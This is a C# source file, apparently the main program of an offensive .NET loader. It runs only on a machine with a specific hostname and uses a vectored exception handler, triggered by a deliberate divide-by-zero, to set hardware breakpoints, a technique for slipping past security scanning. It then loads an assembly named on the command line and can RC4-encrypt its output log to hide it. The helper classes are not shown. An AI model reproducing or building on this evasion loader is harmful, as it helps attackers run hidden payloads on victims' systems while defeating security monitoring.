using System;
using System.IO;
using System.Text;

namespace PositiveIntent
{
    public class Program
    {
        private static bool CheckHostname()
        {
            if (Environment.MachineName != "TESTVM") // placeholder
            {
                return false;
            }
            return true;
        }

        public static void Main(string[] args)
        {
            bool shouldWriteToFile = false; // placeholder
            MemoryStream buffer = null;
            StreamWriter writer = null;

            try
            {
                if (CheckHostname())
                {
                    if (shouldWriteToFile)
                    {
                        buffer = new MemoryStream();
                        writer = new StreamWriter(buffer, Encoding.UTF8) { AutoFlush = true };
                        Console.SetOut(writer);
                        Console.SetError(writer);
                    }

                    BreakpointHelper.SetupHandler();

                    // DivideByZeroException from managed code -> caught by VEH -> set HWBPs -> return to managed handler -> load assembly -> HWBPs fire -> repeat
                    try
                    {
                        int x = 1;
                        int y = 0;
                        int result = x / y;
                    }
                    catch (DivideByZeroException)
                    {
                        AssemblyHelper.LoadAssembly(args);
                    }

                    if (shouldWriteToFile)
                    {
                        writer.Flush();
                        byte[] bytes = buffer.ToArray();
                        RC4 rc4 = new RC4(RC4.key);
                        bytes = rc4.EncryptDecrypt(bytes);
                        File.WriteAllBytes($"{Directory.GetCurrentDirectory()}\\log.txt", bytes);
                    }
                }
            }
            // Need to improve exception handling both globally and locally - handle some exceptions locally if recoverable
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
    }
}
